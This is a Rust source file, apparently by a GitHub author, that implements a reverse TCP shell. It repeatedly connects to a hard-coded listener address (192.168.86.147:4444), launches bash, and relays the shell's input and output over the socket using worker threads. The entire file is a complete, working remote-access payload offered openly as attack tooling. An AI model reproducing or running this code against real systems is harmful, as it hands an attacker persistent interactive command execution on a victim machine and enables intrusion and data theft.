extern crate env_logger;

/// Opens a TCP connection to the configured server and runs a command.
/// In/output from the executed command is redirected from/to the established connection.
/// This is useful for creating a reverse_tcp shell.
///
/// Author: Gavyn Riebau
/// https://github.com/gavynriebau

#[macro_use]
extern crate log;

use std::net::*;
use std::process::*;
use std::io::*;
use std::thread;
use std::sync::{Arc};
use std::sync::mpsc;
use std::sync::mpsc::*;
use std::time::Duration;
use std::sync::atomic::{AtomicBool, Ordering};

const LHOST: &str = "192.168.86.147";
const LPORT: &str = "4444";
const SHELL_TYPE: &str = "bash";
const RETRY_DELAY_MS: u64 = 2_000;

fn handle_network_connection(stream: TcpStream) {
    debug!("Connected to {}", stream.peer_addr().unwrap());

    debug!("Changing stream to non-blocking");
    stream.set_nonblocking(true).unwrap();

    debug!("Cloned stream for use with channels.");
    let cloned_stream = stream.try_clone().expect("Failed to clone TCP stream");

    debug!("Connected to endpoint, starting shell");
    let shell_child = Command::new(SHELL_TYPE)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("Failed to run command");

    debug!("Opening shell IO and creating sender / receiver channels");
    let bash_out = shell_child.stdout.expect("Failed to open command stdout");
    let bash_in = shell_child.stdin.expect("Failed to open command stdin");
    let (net_tx, net_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
    let (shell_tx, shell_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
    let finished = Arc::new(AtomicBool::new(false));

    debug!("Beginning IO read/write loops");
    spawn_net_reader_thread(stream, net_tx, Arc::clone(&finished));
    spawn_shell_reader_thread(cloned_stream, shell_rx, Arc::clone(&finished));
    spawn_shell_writer_thread(bash_out, shell_tx, Arc::clone(&finished));
    spawn_net_writer_thread(bash_in, net_rx, Arc::clone(&finished));

    // Await completion of any thread.
    debug!("Waiting for threads to finish.");
    loop {
        if finished.load(Ordering::Relaxed) {
            debug!("Other thread finished, time to stop.");
            break;
        }

        thread::yield_now();
    }
}

fn spawn_net_reader_thread(mut stream: TcpStream, net_tx: Sender<Vec<u8>>, finished : Arc<AtomicBool>) {
    thread::spawn(move || {
        let mut buffer: [u8; 512] = [0; 512];

        loop {
            if finished.load(Ordering::Relaxed) {
                debug!("spawn_net_reader_thread stopping because other thread is done.");
                break;
            }

            match stream.take_error() {
                Ok(e) => if let Some(e) = e {
                    error!("Stream error: {}", e);
                    finished.store(true, Ordering::Relaxed);
                    break;
                },
                Err(e) => {
                    error!("Failed to call take_error on TcpStream: {}", e);
                    finished.store(true, Ordering::Relaxed);
                    break;
                }
            }

            match stream.read(&mut buffer) {
                Ok(count) => if count > 0 {
                    trace!("{:>4} read from stream", count);

                    match net_tx.send(Vec::from(&buffer[0..count])) {
                        Ok(()) => {
                            trace!("{:>4} sent to net_tx", count);
                        }
                        Err(e) => {
                            error!("Failed to send to net_tx: {}", e);
                            finished.store(true, Ordering::Relaxed);
                        }
                    }
                },
                Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                    // wait until network socket is ready, typically implemented
                    // via platform-specific APIs such as epoll or IOCP
                    thread::yield_now();
                },
                Err(e) => {
                    error!("Error reading from stream: {}", e);
                    finished.store(true, Ordering::Relaxed);
                    break;
                }
            }

            thread::yield_now();
        }

        debug!("net_reader_thread finished");
    });
}

fn spawn_shell_reader_thread(mut stream: TcpStream, shell_rx: Receiver<Vec<u8>>, finished : Arc<AtomicBool>) {
    thread::spawn(move || {
        loop {
            if finished.load(Ordering::Relaxed) {
                debug!("spawn_shell_reader_thread stopping because other thread is done.");
                break;
            }

            match stream.take_error() {
                Ok(e) => if let Some(e) = e {
                    error!("Stream error: {}", e);
                    finished.store(true, Ordering::Relaxed);
                    break;
                },
                Err(e) => {
                    error!("Failed to call take_error on TcpStream: {}", e);
                    finished.store(true, Ordering::Relaxed);
                    break;
                }
            }

            match shell_rx.recv() {
                Ok(data) => {
                    trace!("{:>4} received from shell_rx", data.len());

                    match stream.write(data.as_slice()) {
                        Ok(count) => trace!("{:>4} written to stream", count),
                        Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                            // wait until network socket is ready, typically implemented
                            // via platform-specific APIs such as epoll or IOCP
                            thread::yield_now();
                        },
                        Err(e) => {
                            error!("Failed to write to stream: {}", e);
                            finished.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                }
                Err(e) => {
                    error!("Failed to read from shell: {}", e);
                    finished.store(true, Ordering::Relaxed);
                    break;
                }
            }

            thread::yield_now();
        }

        debug!("shell_reader_thread finished");
    });
}

fn spawn_shell_writer_thread(mut bash_out: ChildStdout, shell_tx: Sender<Vec<u8>>, finished : Arc<AtomicBool>) {
    thread::spawn(move || {
        let mut buffer: [u8; 512] = [0; 512];

        loop {
            if finished.load(Ordering::Relaxed) {
                debug!("spawn_shell_writer_thread stopping because other thread is done.");
                break;
            }

            match bash_out.read(&mut buffer) {
                Ok(count) => if count > 0 {
                    trace!("{:>4} read from shell_out", count);

                    match shell_tx.send(Vec::from(&buffer[0..count])) {
                        Ok(()) => {
                            trace!("{:>4} sent to shell_tx", count);
                        }
                        Err(e) => {
                            error!("Failed to write to shell_tx: {}", e);
                            finished.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                },
                Err(e) => {
                    error!("Failed to read from bash_out: {}", e);
                    finished.store(true, Ordering::Relaxed);
                    break;
                }
            }

            thread::yield_now();
        }

        debug!("shell_writer_thread finished");
    });
}

fn spawn_net_writer_thread(mut bash_in: ChildStdin, net_rx: Receiver<Vec<u8>>, finished : Arc<AtomicBool>) {
    thread::spawn(move || {
        loop {
            if finished.load(Ordering::Relaxed) {
                debug!("spawn_net_writer_thread stopping because other thread is done.");
                break;
            }

            match net_rx.recv() {
                Ok(data) => {
                    trace!("{:>4} received from net_rx", data.len());

                    match bash_in.write(data.as_slice()) {
                        Ok(count) => {
                            trace!("{:>4} written to bash_in", count);
                        }
                        Err(e) => {
                            error!("Failed to write to bash_in: {}", e);
                            finished.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                }
                Err(e) => {
                    error!("Failed to receive from net_rx: {}", e);
                    finished.store(true, Ordering::Relaxed);
                    break;
                }
            }

            thread::yield_now();
        }

        debug!("net_writer_thread finished");
    });
}

fn main() {
    env_logger::init();

    loop {
        let remote_server = format!("{}:{}", LHOST, LPORT);
        debug!("Attempting to connect to '{}'", remote_server);

        match TcpStream::connect(remote_server) {
            Ok(stream) => handle_network_connection(stream),
            Err(_) => {
                warn!("Failed to connect, waiting before retry");
                std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
            }
        }
    }
}
